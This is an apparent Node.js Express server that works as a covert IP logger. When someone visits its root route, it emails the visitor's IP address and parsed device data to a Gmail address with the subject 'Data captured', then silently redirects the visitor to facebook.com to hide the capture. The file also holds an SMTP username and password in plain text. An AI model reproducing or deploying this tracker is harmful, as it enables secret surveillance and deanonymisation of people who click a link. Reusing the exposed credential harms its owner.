const DeviceDetector = require('node-device-detector');
const DeviceHelper = require('node-device-detector/helper');
var nodemailer = require('nodemailer');



const express = require('express');
const port = 8080;
var host = "localhost";
const app = express();


/* Mail */
var smtpTransport = nodemailer.createTransport({
    host: "mail.privateemail.com",
    port: 587,
    secure: false, // upgrade later with STARTTLS
    auth: {
      user: "mark@theluckyhub.com",
      pass: "A8wQu3{bM-]EXn`f",
    },
    tls: {
        ciphers:'SSLv3'
    }
  });

  

app.get("/", (req, res, next) => {
    const detector = new DeviceDetector;
    const userAgent = 'Mozilla/5.0 (Linux; Android 5.0; NX505J Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Mobile Safari/537.36';
    const result = detector.detect(userAgent);

    var smptOptions = {
        from: "mark@theluckyhub.com", // sender address
        to: "promaxcoq@gmail.com", // list of receivers
        subject: "Data captured", // Subject line
        text: "IP is... " + req.ip + JSON.stringify(result)
        // html: "<b>Hello world ✔</b>" // html body
      };
    

    // console.log('ip', req.ip);
    smtpTransport.sendMail(smptOptions, function(error, info){
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });

      res.writeHead(301, {
        Location: `https://facebook.com`
      }).end();
      
    // res.status(200).send(result);
})

var server = app.listen(port, function(){
    
    console.log(`Server running on http://${host}:${port}`)
});
